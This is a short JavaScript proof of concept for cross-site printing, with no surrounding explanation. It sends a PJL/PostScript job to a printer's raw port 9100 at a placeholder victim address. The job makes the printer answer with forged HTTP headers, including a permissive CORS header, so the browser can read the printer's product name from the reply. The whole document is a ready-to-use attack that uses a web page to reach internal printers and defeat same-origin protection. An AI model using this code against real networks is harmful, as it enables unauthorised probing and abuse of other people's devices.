job = "\x1B%-12345X\r\n"
    + "%!\r\n"
    + "(HTTP/1.0 200 OK\\n) print\r\n"
    + "(Server: PostScript HTTPD\\n) print\r\n"
    + "(Access-Control-Allow-Origin: *\\n) print\r\n"
    + "(Connection: close\\n) print\r\n"
    + "(Content-Length: ) print\r\n"
    + "product dup length dup string cvs print\r\n"
    + "(\\n\\n) print\r\n"
    + "print\r\n"
    + "(\\n) print flush\r\n"
    + "\x1B%-12345X\r\n";

var x = new XMLHttpRequest();
x.open("POST", "http://<victim_ip>:9100");
x.send(job);
x.onreadystatechange = function() {
  if (x.readyState == 4)
    alert(x.responseText);
};
